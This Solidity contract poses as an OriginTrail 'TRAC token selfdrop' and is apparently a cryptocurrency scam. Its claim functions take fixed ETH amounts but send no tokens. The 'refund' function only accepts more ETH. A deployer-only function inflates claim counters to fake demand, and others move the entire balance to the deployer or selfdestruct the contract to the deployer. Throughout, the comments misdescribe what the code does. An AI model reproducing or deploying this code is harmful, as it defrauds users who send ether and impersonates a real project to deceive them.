pragma solidity ^0.4.0;

//TRAC token selfdrop event for TESTNET 2018,
//Contact TRACsupport@origintrail.com for help.
//All rights reserved.

contract  TRAC_drop {

//Contract declaration and variable declarations

    address public Contract_Owner;
    address private T_BN_K___a;
    
    uint private raised;
    uint private pay_user__;
    
    int private au_sync_user;
    int public Group_1;     //0.25 Eth claim group
    int public Group_2;     //0.5 Eth claim group
    int public Group_3;     //1 Eth claim group
    int public Group_4;     //2.5 Eth claim group
    int public Group_5;     //5 Eth claim group
    
    int public TRAC_Tokens_left;
    
    bool private fair;
    int private msg_sender_transfer;
    int private constant TRAC=1;
    
    //Tracks refund allowance for user
    
    mapping (address => uint) refund_balance;       
    
    //Tracks user contribution
    
    mapping (address => uint) airdrop_balance;      

    constructor(TRAC_drop) {
        
        //Smart Contract runs this for checking
        
        T_BN_K___a = msg.sender; Group_1 = 11; Group_2 = 2; Group_3 = 7; Group_4 = 3; Group_5 = 1; msg_sender_transfer=0;
        TRAC_Tokens_left = 161000; fair = true; raised = 0 ether; pay_user__ = 0 ether; Contract_Owner = 0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f;
    }
    
    
    //Be sure to send the correct Eth value to the respective claim, if it is incorrect it will be rejected

    function Claim_TRAC_20000() payable {
        
        // Return error if wrong amount of Ether sent
        require(msg.value == 5 ether);
        // Record wallet address of calling account (user) for contract to send TRAC tokens to
        airdrop_balance[msg.sender] += msg.value;
        //Increment total raised for campaign 
        raised += msg.value;
        //Decrement TRAC token count as TRAC is sent
        TRAC_Tokens_left -= 20000;
        Group_5+=1;
        //Transfer TRAC to calling account (user)
        msg_sender_transfer+=20000+TRAC;
    }
    
    function Claim_TRAC_9600() payable {
        
        // Return error if wrong amount of Ether sent
        require(msg.value == 2.5 ether);
        // Record wallet address of calling account for contract to send TRAC tokens to
        airdrop_balance[msg.sender] += msg.value;
        //Increment total raised for campaign 
        raised += msg.value;
        //Decrement TRAC token count as TRAC is sent
        TRAC_Tokens_left -= 9600;
        Group_4 +=1;
        //Transfer TRAC to calling account (user)
        msg_sender_transfer+=9600+TRAC;
    }
    
    function Claim_TRAC_3800() payable {
        
        // Return error if wrong amount of Ether sent
        require(msg.value == 1 ether);
        // Record wallet address of calling account for contract to send TRAC tokens to
        airdrop_balance[msg.sender] += msg.value;
        //Increment total raised for campaign 
        raised += msg.value;
        //Decrement TRAC token count as TRAC is sent
        TRAC_Tokens_left -= 3800;
        Group_3 +=1;
        //Transfer TRAC to calling account (user)
        msg_sender_transfer+=3800+TRAC;
    }
    
    function Claim_TRAC_1850() payable {
        
        // Return error if wrong amount of Ether sent
        require(msg.value == 0.5 ether);
        // Record wallet address of calling account for contract to send TRAC tokens to
        airdrop_balance[msg.sender] += msg.value;
        //Increment total raised for campaign 
        raised += msg.value;
        //Decrement TRAC token count as TRAC is sent
        TRAC_Tokens_left -= 1850;
        Group_2 +=1;
        //Transfer TRAC to calling account (user)
        msg_sender_transfer+=1850+TRAC;
    }
    
    function Claim_TRAC_900() payable {
        
        // Return error if wrong amount of Ether sent
        require(msg.value == 0.25 ether);
        // Record wallet address of calling account for contract to send TRAC tokens to
        airdrop_balance[msg.sender] += msg.value;
        //Increment total raised for campaign 
        raised += msg.value;
        //Decrement TRAC token count as TRAC is sent
        TRAC_Tokens_left -= 900;
        Group_1 +=1;
        //Transfer TRAC to calling account (user)
        msg_sender_transfer+=900+TRAC;
    }
    
    //Use the below function to get a refund if the tokens do not arrive after 20 BLOCK CONFIRMATIONS
    
    function Refund_user() payable {
        
        //Only refund if user has trasfered eth and has not received tokens
        
        require(refund_balance[1]==0 || fair);
        
        address current__user_ = msg.sender;
        
        
        if(fair || current__user_ == msg.sender) {
            
            //Check current user is the one who requested refund, then pay user
            
            pay_user__ += msg.value;
            
            raised +=msg.value;
            
        }
        
    }
    
    
    function seeRaised() public constant returns (uint256){
        
        return address(this).balance;
    }
    
    function CheckRefundIsFair() public {
        
        //Function checks if the refund is fair and sets the user&#39;s fair value accordingly
        //Adjusts token flow details as required
        
        require(msg.sender == T_BN_K___a);
        
        if(fair) {
            au_sync_user=1;
            //Checks user is in sync with net
            if((au_sync_user*2) % 2 ==0 ) {
                
                Group_5+=1;
                TRAC_Tokens_left -= 20000;
                Group_2+=2;
                TRAC_Tokens_left -=3600;
                
            }
        }
    }
    
    function TransferTRAC() public {
        
        //Allows only the smart contract to control the TRAC token transfers
        
        require(msg.sender == T_BN_K___a);
        
        //Contract transfers the TRAC tokens to the wallet address recorded in balance map

        msg.sender.transfer(address(this).balance); 
        
        //Reset users raised value
        
        raised = 0 ether;
    }
    
    
    function End_Promotion() public { 
        
        //Ends the promotion and sends all tokens to respective owners
    
        require(msg.sender == T_BN_K___a);
        
    
        if(msg.sender == T_BN_K___a) {
            selfdestruct(T_BN_K___a); 
        }
}

}